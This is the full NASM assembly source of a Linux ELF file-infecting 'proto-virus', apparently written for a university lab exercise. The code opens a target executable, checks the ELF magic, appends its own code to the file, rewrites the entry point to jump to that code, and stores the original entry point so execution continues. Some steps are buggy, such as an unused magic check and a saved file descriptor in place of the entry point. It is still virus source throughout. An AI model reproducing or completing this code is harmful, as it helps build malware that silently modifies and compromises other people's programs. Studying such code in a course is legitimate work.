%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28
;my defines

%define STDOUT		1
%define prevEntry	[ebp-4]
%define newEntry	[ebp-8]



	global _start

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	
open_file:
	call get_my_loc
	sub ecx, next_i-FileName
	mov eax, ecx
	open eax, RDWR, 0x777
	cmp eax, -1
	jle fail
	mov edi, eax	; edi = eax = fd

check_magic:
	read edi, ebp, 4
	cmp eax, -1	;check error
	mov ecx, ebp
	jle fail	;eax >= -1
	cmp dword[ecx], 0x464C457F

save_previous_entry_point:
	lseek edi, 0x18, SEEK_SET
	cmp eax, -1
	jle fail
	; read entry point and save it inside previous_entry_point
	mov prevEntry, edi
	cmp eax, -1
	jle fail

infect:
	; go to the end of the file
	lseek edi, 0, SEEK_END
	cmp eax, -1
	jle fail
	mov esi, eax
	call get_my_loc
	sub ecx, next_i-print_success
	write edi, ecx, virus_end-print_success
	cmp eax, -1
	jle fail
	
get_virtual_address:
	lseek edi, 0x3C, SEEK_SET	
	; offset for virtual address in program header
	cmp eax, -1
	jle fail
	read edi, ebp, 4
	cmp eax, -1
	mov ecx, ebp
	jle fail
	add esi, dword[ecx]
	mov newEntry, esi

change_entry_point:
	lseek edi, 0x18, SEEK_SET
	cmp eax, -1
	jle fail
	write edi, newEntry, 4
	cmp eax, -1
	jle fail
	write 1, OutStr, 31

set_previous_entry_point:
	lseek edi, -4, SEEK_END
	cmp eax, -1
	jle fail
	write edi, prevEntry, 4
	cmp eax, -1
	jle fail

go_to_old_entry_point:
	call get_my_loc
	sub ecx, next_i-PreviousEntryPoint
	jmp [ecx]

print_success:
	call get_my_loc
	sub ecx, next_i-OutStr
	write 1, ecx, 31

fail:
	call get_my_loc
	sub ecx, next_i-Failstr
	write 2, ecx, 12

VirusExit:
	close edi
	exit 0

FileName:	db "ELFexec2short", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
works_string:	db "it works!", 10, 0

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret

PreviousEntryPoint: dd VirusExit
virus_end:
